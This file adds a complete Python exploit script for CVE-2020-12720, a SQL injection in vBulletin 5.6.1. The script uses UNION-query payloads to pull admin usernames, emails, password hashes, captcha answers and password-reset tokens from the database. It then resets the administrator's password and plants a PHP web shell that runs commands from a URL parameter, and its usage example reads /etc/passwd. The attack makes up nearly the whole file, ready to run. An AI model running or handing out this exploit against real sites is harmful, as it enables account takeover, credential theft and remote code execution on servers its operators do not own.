@@ -1,0 +1,267 @@
+# Exploit Title: vBulletin 5.6.1 - 'nodeId' SQL Injection
+# Date: 2020-05-15
+# Exploit Author: Photubias
+# Vendor Advisory: [1] https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4440032-vbulletin-5-6-1-security-patch-level-1
+# Version: vBulletin v5.6.x (prior to Patch Level 1)
+# Tested on: vBulletin v5.6.1 on Debian 10 x64
+# CVE: CVE-2020-12720 vBulletin v5.6.1 (SQLi) with path to RCE
+
+#!/usr/bin/env python3
+'''
+
+    
+	Copyright 2020 Photubias(c)
+
+        This program is free software: you can redistribute it and/or modify
+        it under the terms of the GNU General Public License as published by
+        the Free Software Foundation, either version 3 of the License, or
+        (at your option) any later version.
+
+        This program is distributed in the hope that it will be useful,
+        but WITHOUT ANY WARRANTY; without even the implied warranty of
+        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+        GNU General Public License for more details.
+
+        You should have received a copy of the GNU General Public License
+        along with this program.  If not, see <http://www.gnu.org/licenses/>.
+        
+        File name CVE-2020-12720.py
+        written by tijl[dot]deneut[at]howest[dot]be for www.ic4.be
+
+        This is a native implementation without requirements, written in Python 3.
+        Works equally well on Windows as Linux (as MacOS, probably ;-)
+        
+        ##-->> Full creds to @zenofex and @rekter0 <<--##
+'''
+import urllib.request, urllib.parse, sys, http.cookiejar, ssl, random, string
+
+## Static vars; change at will, but recommend leaving as is
+sADMINPASS = '12345678'
+sCMD = 'id'
+sURL = 'http://192.168.50.130/'
+sUSERID = '1'
+sNEWPASS = '87654321'
+iTimeout = 5
+
+## Ignore unsigned certs
+ssl._create_default_https_context = ssl._create_unverified_context
+
+## Keep track of cookies between requests
+cj = http.cookiejar.CookieJar()
+oOpener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
+
+def randomString(stringLength=8):
+    letters = string.ascii_lowercase
+    return ''.join(random.choice(letters) for i in range(stringLength))
+
+def getData(sUrl, lData):
+    try:
+        oData = urllib.parse.urlencode(lData).encode()
+        oRequest = urllib.request.Request(url = sUrl, data = oData)
+        return oOpener.open(oRequest, timeout = iTimeout)
+    except:
+        print('----- ERROR, site down?')
+        sys.exit(1)
+
+def verifyBug(sURL,sUserid='1'):
+    sPath = 'ajax/api/content_infraction/getIndexableContent'
+    lData = {'nodeId[nodeid]' : '1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,"cve-2020-12720",8,7,6,5,4,3,2,1;--'}
+    sResponse = getData(sURL + sPath, lData).read().decode()
+    if not 'cve-2020-12720' in sResponse:
+        print('[!] Warning: not vulnerable to CVE-2020-12720, credentials are needed!')
+        return False
+    else:
+        print('[+] SQLi Success!')
+        return True
+
+def takeoverAccount(sURL, sNEWPASS):
+    sPath = 'ajax/api/content_infraction/getIndexableContent'
+    ### Source: https://github.com/rekter0/exploits/tree/master/CVE-2020-12720
+    ## Get Table Prefixes
+    lData = {'nodeId[nodeid]' : '1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,table_name,8,7,6,5,4,3,2,1 from information_schema.columns WHERE column_name=\'phrasegroup_cppermission\';--'}
+    sResponse = getData(sURL + sPath, lData).read().decode()
+    if 'rawtext' in sResponse: sPrefix = sResponse.split('rawtext')[1].split(':')[1].replace('}','').replace('"','').replace('language','')
+    else: sPrefix = ''
+    #print('[+] Got table prefix "'+sPrefix+'"')
+
+    ## Get usergroup ID for "Administrators"
+    lData = {'nodeId[nodeid]' : '1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,usergroupid,8,7,6,5,4,3,2,1 from ' + sPrefix + 'usergroup WHERE title=\'Administrators\';--'}
+    sResponse = getData(sURL + sPath, lData).read().decode()
+    sGroupID = sResponse.split('rawtext')[1].split(':')[1].replace('}','').replace('"','')
+    #print('[+] Administrators Group ID: '+sGroupID)
+    
+    ## Get admin data, including original token (password hash), TODO: an advanced exploit could restore the original hash in post exploitation
+    lData = {'nodeId[nodeid]' : '1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,concat(username,0x7c,userid,0x7c,email,0x7c,token),8,7,6,5,4,3,2,1 from ' + sPrefix + 'user where usergroupid=' + sGroupID + ';--'}
+    sResponse = getData(sURL + sPath, lData).read().decode()
+    sUsername,sUserid,sUsermail,sUserTokenOrg = sResponse.split('rawtext')[1].split(':')[1].replace('}','').replace('"','').split('|')
+    #print('[+] Got original token (' + sUsername + ', ' + sUsermail + '): ' + sUserTokenOrg)
+
+    ## Let's create a Human Verify Captcha
+    sPath = 'ajax/api/hv/generateToken?'
+    lData = {'securitytoken':'guest'}
+    sResponse = getData(sURL + sPath, lData).read().decode()
+    if 'hash' in sResponse: sHash = sResponse.split('hash')[1].split(':')[1].replace('}','').replace('"','')
+    else: sHash = ''
+
+    ## Get the captcha answer from DB
+    sPath = 'ajax/api/content_infraction/getIndexableContent'
+    lData = {'nodeId[nodeid]':'1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,count(answer),8,7,6,5,4,3,2,1 from ' + sPrefix + 'humanverify limit 0,1--'}
+    sResponse = getData(sURL + sPath, lData).read().decode()
+    if 'rawtext' in sResponse: iAnswers = int(sResponse.split('rawtext')[1].split(':')[1].replace('}','').replace('"',''))
+    else: iAnswers = 1
+
+    lData = {'nodeId[nodeid]':'1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,answer,8,7,6,5,4,3,2,1 from ' + sPrefix + 'humanverify limit ' + str(iAnswers-1) + ',1--'}
+    sResponse = getData(sURL + sPath, lData).read().decode()
+    if 'rawtext' in sResponse: sAnswer = sResponse.split('rawtext')[1].split(':')[1].replace('}','').replace('"','')
+    else: sAnswer = ''
+
+    ## Now request PW reset and retrieve the token
+    sPath = 'auth/lostpw'
+    lData = {'email':sUsermail,'humanverify[input]':sAnswer,'humanverify[hash]':sHash,'securitytoken':'guest'}
+    sResponse = getData(sURL + sPath, lData).read().decode()
+    
+    sPath = 'ajax/api/content_infraction/getIndexableContent'
+    lData = {'nodeId[nodeid]':'1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,activationid,8,7,6,5,4,3,2,1 from ' + sPrefix + 'useractivation WHERE userid=' + sUserid + ' limit 0,1--'}
+    sResponse = getData(sURL + sPath, lData).read().decode()
+    if 'rawtext' in sResponse: sToken = sResponse.split('rawtext')[1].split(':')[1].replace('}','').replace('"','')
+    else: sToken = ''
+
+    ## Finally the password reset itself
+    sPath = 'auth/reset-password'
+    lData = {'userid':sUserid,'activationid':sToken,'new-password':sNEWPASS,'new-password-confirm':sNEWPASS,'securitytoken':'guest'}
+    sResponse = getData(sURL + sPath, lData).read().decode()
+    if not 'Logging in' in sResponse:
+        print('[-] Failed to reset the password')
+        return ''
+    else:
+        print('[+] Success! User ' + sUsername + ' now has password ' + sNEWPASS)
+    return sUserid
+
+def createBackdoor(sURL, sADMINPASS, sUserid='1'):
+    ## Activating Sitebuilder
+    sPath = 'ajax/activate-sitebuilder'
+    lData = {'pageid':'1', 'nodeid':'0','userid':'1','loadMenu':'false', 'isAjaxTemplateRender':'true', 'isAjaxTemplateRenderWithData':'true','securitytoken':'1589477194-0e3085507fb50fc1631610a28e045c5fa71a2a12'}
+    oResponse = getData(sURL + sPath, lData)
+    if not oResponse.code == 200:
+        print('[-] Error activating sitebuilder')
+        sys.exit(1)
+
+    ## Confirming the password, getting new securitytoken
+    sPath = 'auth/ajax-login'
+    lData = {'logintype':'cplogin','userid':sUserid,'password':sADMINPASS,'securitytoken':'1589477194-0e3085507fb50fc1631610a28e045c5fa71a2a12'}
+    oResponse = getData(sURL + sPath, lData)
+    sResponse = oResponse.read().decode()
+    if 'lostpw' in sResponse:
+        print('[-] Error: authentication for userid ' + sUserid + ' failed')
+        sys.exit(1)
+    sToken = sResponse.split(',')[1].split(':')[1].replace('"','').replace('}','')
+    print('[+] Got token: '+sToken)
+
+    ## cpsession is needed, use this for extra verification
+    #for cookie in cj: print(cookie.name, cookie.value, cookie.domain) #etc etc
+
+    ## First see if our backdoor does not already exists
+    sPath = 'ajax/render/admin_sbpanel_pagelist_content_wrapper'
+    lData = {'isAjaxTemplateRenderWithData':'true','securitytoken':sToken}
+    oResponse = getData(sURL + sPath, lData)
+    sResponse = oResponse.read().decode()
+    if 'cve-2020-12720' in sResponse:
+        sPageName = 'cve-2020-12720-' + sResponse.split('/cve-2020-12720-')[1].split(')')[0]
+        print('[+] This machine was already pwned, using "' + sPageName + '" for your command')
+        return sPageName
+    
+
+    ## Create a new empty page
+    sPath = 'ajax/api/widget/saveNewWidgetInstance'
+    lData = {'containerinstanceid':'0','widgetid':'23','pagetemplateid':'','securitytoken':sToken}
+    oResponse = getData(sURL + sPath, lData)
+    sResponse = oResponse.read().decode()
+    sWidgetInstanceID = sResponse.split(',')[0].split(':')[1].replace('}','')
+    sPageTemplateID = sResponse.split(',')[1].split(':')[1].replace('}','')
+    print('[+] Got WidgetInstanceID: '+sWidgetInstanceID+' and PageTemplateID: '+sPageTemplateID)
+
+    ## Now submitting the page content
+    sPageName = 'cve-2020-12720-'+randomString()
+    sPath = 'ajax/api/widget/saveAdminConfig'
+    lData = {'widgetid':'23',
+             'pagetemplateid':sPageTemplateID,
+             'widgetinstanceid':sWidgetInstanceID,
+             'data[widget_type]':'',
+             'data[title]':sPageName,
+             'data[show_at_breakpoints][desktop]':'1',
+             'data[show_at_breakpoints][small]':'1',
+             'data[show_at_breakpoints][xsmall]':'1',
+             'data[hide_title]':'0',
+             'data[module_viewpermissions][key]':'show_all',
+             'data[code]':"echo('###SHELLRESULT###');system($_GET['cmd']);echo('###SHELLRESULT###');",
+             'securitytoken':sToken}
+    oResponse = getData(sURL + sPath, lData)
+    if not oResponse.code == 200: print('[!] Error submitting page content for ' + sPageName)
+    
+    ## Finally saving the new page
+    sPath = 'admin/savepage'
+    lData = {'input[ishomeroute]':'0',
+             'input[pageid]':'0',
+             'input[nodeid]':'0',
+             'input[userid]':'1',
+             'input[screenlayoutid]':'2',
+             'input[templatetitle]':sPageName,
+             'input[displaysections[0]]':'[{"widgetId":"23","widgetInstanceId":"' + sWidgetInstanceID + '"}]',
+             'input[displaysections[1]]':'[]',
+             'input[displaysections[2]]':'[]',
+             'input[displaysections[3]]':'[]',
+             'input[pagetitle]':sPageName,
+             'input[resturl]':sPageName,
+             'input[metadescription]':'Photubias+Shell',
+             'input[pagetemplateid]':sPageTemplateID,
+             'url':sURL,
+             'securitytoken':sToken}
+    oResponse = getData(sURL + sPath, lData)
+    if not oResponse.code == 200: print('[!] Error saving page content for ' + sPageName)
+    return sPageName
+
+def main():
+    if len(sys.argv) == 1:
+        print('[!] No arguments found: python3 CVE-2020-12720.py <URL> <CMD>')
+        print('    Example: ./CVE-2020-12720.py http://192.168.50.130/ "cat /etc/passwd"')
+        print('    But for now, ask questions then')
+        sURL = input('[?] Please enter the address and path to vBulletin ([http://192.168.50.130/): ')
+        if sURL == '': sURL = 'http://192.168.50.130'
+    else:
+        sURL = sys.argv[1]
+        sCMD = sys.argv[2]
+    if not sURL[:-1] == '/': sURL += '/'
+    if not sURL[:4].lower() == 'http': sURL = 'http://' + sURL
+    print('[+] Welcome, first verifying the SQLi vulnerability')
+    if verifyBug(sURL):
+        print("----\n" + '[+] Attempting automatic admin account takeover')
+        sUSERID = takeoverAccount(sURL, sNEWPASS)
+        sADMINPASS = sNEWPASS
+        if sUSERID == '':
+            sUSERID = '1'
+            sADMINPASS = input('[?] Please enter the admin password (userid ' + sUSERID + '): ')
+    else:
+        sADMINPASS = input('[?] Please enter the admin password (userid ' + sUSERID + '): ')
+    print("----\n"+'[+] So far so good, attempting the creation of the backdoor')
+    sPageName = createBackdoor(sURL, sADMINPASS, sUSERID)
+
+    if len(sys.argv) == 1: sCMD = input('[?] Please enter the command to run [id]: ')
+    if sCMD == '': sCMD = 'id'
+    sCmd =  urllib.parse.quote(sCMD)
+    sPath = sPageName + "?cmd=" + sCmd
+
+    print('[+] Opening '+sURL + sPath)
+    try:
+        oRequest = urllib.request.Request(url = sURL + sPath)
+        oResponse = oOpener.open(oRequest, timeout = iTimeout)
+        print('#######################')
+        sResponse = oResponse.read().decode()
+        print('[+] Command result:')
+        print(sResponse.split('###SHELLRESULT###')[1])
+    except:
+        print('[-] Something went wrong, bad command?')
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
